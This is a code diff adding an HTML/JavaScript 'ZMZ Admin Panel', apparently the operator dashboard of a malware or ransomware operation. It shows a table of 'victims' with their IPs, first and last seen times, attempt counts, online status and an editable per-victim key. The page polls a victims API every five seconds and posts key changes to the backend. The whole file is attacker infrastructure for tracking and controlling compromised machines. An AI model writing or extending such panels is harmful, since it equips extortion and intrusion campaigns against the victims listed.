@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>ZMZ Admin Panel</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        th, td {
+            border: 1px solid #0ff;
+            padding: 10px;
+            text-align: left;
+        }
+        
+        th {
+            background: #1a1a1a;
+        }
+        
+        .online { color: #0f0; }
+        .offline { color: #f00; }
+        
+        button {
+            background: #000;
+            color: #0ff;
+            border: 2px solid #0ff;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        
+        input {
+            background: #000;
+            color: #0ff;
+            border: 2px solid #0ff;
+            padding: 5px;
+            width: 100px;
+        }
+    </style>
+</head>
+<body>
+    <h1>👑 ZMZ ADMIN PANEL</h1>
+    <p>Total Victim: <span id="total">0</span> | Online: <span id="online">0</span></p>
+    
+    <table id="victimTable">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>IP</th>
+                <th>First Seen</th>
+                <th>Last Seen</th>
+                <th>Attempts</th>
+                <th>Key</th>
+                <th>Status</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody></tbody>
+    </table>
+
+    <script>
+        async function loadVictims() {
+            const response = await fetch('/api/admin/victims');
+            const data = await response.json();
+            
+            const tbody = document.querySelector('#victimTable tbody');
+            tbody.innerHTML = '';
+            
+            let online = 0;
+            
+            data.victims.forEach(v => {
+                if (v.online) online++;
+                
+                const row = tbody.insertRow();
+                row.innerHTML = `
+                    <td>${v.id.substring(0, 8)}...</td>
+                    <td>${v.ip}</td>
+                    <td>${new Date(v.firstSeen).toLocaleString()}</td>
+                    <td>${new Date(v.lastSeen).toLocaleString()}</td>
+                    <td>${v.attempts}</td>
+                    <td><input type="text" value="${v.key}" data-id="${v.id}" class="key-input"></td>
+                    <td class="${v.online ? 'online' : 'offline'}">${v.online ? 'ONLINE' : 'OFFLINE'}</td>
+                    <td><button onclick="updateKey('${v.id}')">Update</button></td>
+                `;
+            });
+            
+            document.getElementById('total').innerText = data.victims.length;
+            document.getElementById('online').innerText = online;
+        }
+        
+        async function updateKey(victimId) {
+            const input = document.querySelector(`.key-input[data-id="${victimId}"]`);
+            const newKey = input.value;
+            
+            await fetch('/api/admin/key', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ victimId, newKey })
+            });
+            
+            alert('Key updated!');
+        }
+        
+        // Refresh tiap 5 detik
+        loadVictims();
+        setInterval(loadVictims, 5000);
+    </script>
+</body>
+</html>
